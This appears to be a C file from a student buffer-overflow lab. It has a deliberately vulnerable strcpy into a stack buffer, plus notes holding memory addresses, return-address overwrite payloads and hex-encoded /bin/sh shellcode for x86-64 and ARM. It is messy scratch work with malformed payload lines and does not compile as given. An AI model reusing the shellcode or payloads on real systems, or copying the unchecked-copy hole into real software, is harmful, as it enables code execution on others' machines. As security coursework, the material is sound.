#include <stdio.h>
#include <string.h>
#include <sys/stat.h> 
#include <fcntl.h>

char filename[100]; //0x080ebf40 \x40\xbf\x0e\x08
//080a9070 \x70\x90\x0a\x08
//0xffffde8a \x8a\xde\xff\xff
//0xffffde68 \x68\xde\xff\xff
// 0xffffdfd0 \xd0\xdf\xff\xff
//0xffffde83 \x83\xde\xff\xff
//0xffffd84f \x4f\xd8\xff\xff
//0x08048e72 \x72\x8e\x04\x08
//0xffffde90 \x90\xde\xff\xff
//0xffffdf07 \x07\xdf\xff\xff
//0xffffdfe5 \xe5\xdf\xff\xff
//0xffffd8cb \xcb\xd8\xff\xff
//0xffffd8d6 \xd6\xd8\xff\xff
//0xffffd8e5 \xff\xff\xd8\xe5
//080e6833 \x33\x68\x0e\x08
//0xffffdfe5 \xe5\xdf\xff\xff
//0x80ebf40 \x40\xbf\xeb\08
//0xffffd86d \x6d\xd8\xff\xff
//"$(python -c 'print (29*"A" + "\x30\xf2\x04\x08\x72\x8e\x04\x08\x40\xbf\xeb\x08\xe5\xdf\xff\xff")')" \xd8\xd8\ff\xff
//run "$(python -c 'print 29*"A" + "\xf0\xce\x06\x08\x72\x8e\x04\x08\x40\xbf\x0e\x08\x6d\xd8\xff\xff"')"
//b
//"$(python -c 'print (29*"A" + "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68")')"
//"$(python -c 'print (29*"A" + "\xf0\xce\x06\x08\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")')"
0x0806cef0 \xf0\xce\x06\x08
"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"      
"\x01\x30\x8f\xe2"
           "\x13\xff\x2f\xe1"
           "\x78\x46\x0a\x30"
           "\x01\x90\x01\xa9"
           "\x92\x1a\x0b\x27"
           "\x01\xdf\x2f\x2f"
           "\x62\x69\x6e\x2f"
           "\x73\x68"
void test(char* input)
{
    char test[17] = "abc";
    strcpy(test, input);
    
    printf("You have input: %s\n", test);
}

void log_result() //08048e72 \x72\x8e\x04\x08
{
    int fd = open(filename, O_APPEND | O_CREAT);//0x8048e85 \x85\x8e\x04\x08
    close(fd);
}

//evmrou
void log_result_advanced(int print)
{
    if(print == 0xefbeadde)
    {
        char filename2[100];
        int uid = getuid();
        // the file needs to be generated at a location where normal users cannot touch
        sprintf(filename2, "uid_%d_crack_advanced", uid); //0804f24a
        printf("file name: %s\n", filename2);
        int fd = open(filename2, O_APPEND | O_CREAT);
        close(fd);
    }
}

void main(int argc, char** args)
{
    printf("address of function main() is :%p\n", log_result); 
    if(argc > 1)
    {
        int uid = getuid();
        // the file needs to be generated at a location where normal users cannot touch
        sprintf(filename, "uid_%d_crack", uid); //0x0804f230 = \x30\xf2\x04\x08
        printf("file name: %s\n", filename);
        test(args[1]);
    }
    else
    {
        printf("Please provide at least one input\n");
    }
}

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA/xa0/x8e/x04/x08
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/x72/xa0/x04/x8e\x08
efbeadde
"$(printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/xef/xbe/xad/xde/xa0/x8e/x04/x08")"
8048ead
//1492: 08048ea0   105 FUNC    GLOBAL DEFAULT    6 log_result_advanced
 // /xa0/x8e/x04/x08
 //1870: 088e04a072    46 FUNC    GLOBAL DEFAULT    6 log_result
//        
//804000a